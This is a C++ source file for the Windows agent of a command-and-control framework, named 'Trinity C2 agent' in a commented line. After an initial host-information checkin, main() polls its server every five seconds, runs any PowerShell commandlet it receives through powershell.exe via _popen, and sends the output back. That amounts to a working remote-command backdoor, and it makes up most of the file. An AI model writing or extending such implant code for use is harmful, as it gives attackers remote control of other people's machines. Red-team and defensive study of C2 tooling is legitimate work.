//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommManager.h"
#include "CheckinModels.h"
#include "TaskQueueManager.h"
#include "AgentModule.h"
#include <windows.h>
#include <vector>

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return "Error executing PowerShell command.";
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    _pclose(pipe);
    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

int main(int argc, char *argv[])
{

    AgentModule agentMod;
    TaskQueueManager taskManager;
    CommManager manager = CommManager();

    IntitalCheckinRequest intialRequest = agentMod.GetHostInformation();
    manager.IntialCheckin(intialRequest.StructToJson());
    Agent agent;
    agent.Init();

    while (true)
    {
        if (!taskManager.HasPendingResult())
        {
            taskManager.QueueTask(manager.Checkin());
        }
        else
        {
            std::string newTask = manager.Checkin(taskManager.GetTaskResult());
            taskManager.QueueTask(newTask);
        }

        if (taskManager.HasPendingTask())
        {
            CheckinResponse task = taskManager.GetNextTask();
            switch (task.type)
            {
            case 1:
                std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
                taskManager.StoreTaskResult(task.id, true, result);
                break;
            }
        }
        Sleep(5000);
    }
    // Enter agent loop (delayed every 5 seconds)
    // Call Checkin method uses the callbackuuid 
    // Serialise the request using ParseCommand
    // 

    //std::string hello = dummyData.StructToJson();
    //manager.IntialCheckin(hello);
    //MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);

    //Agent agent;
    //agent.Init();
    //CheckinResponse response;
    //std::string command = R"(
    //{ 
    //    "taskID": 4, 
    //    "agentID": 9, 
    //    "commandType": "PowerShell", 
    //    "command": { "Arguements": "test", "Commandlet": "ls" },
    //    "timestamp": "2026" 
    //}
    //)";

    //response = ParseCommand(command);

    //switch (string_hash(response.type))
    //{
    //    case string_hash("PowerShell"):
    //        std::string result = agent.ExecutePowerShell(response.powerShellCommand.commandlet);
    //        std::cout << result << "\n";
    //        break;
    //}
    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
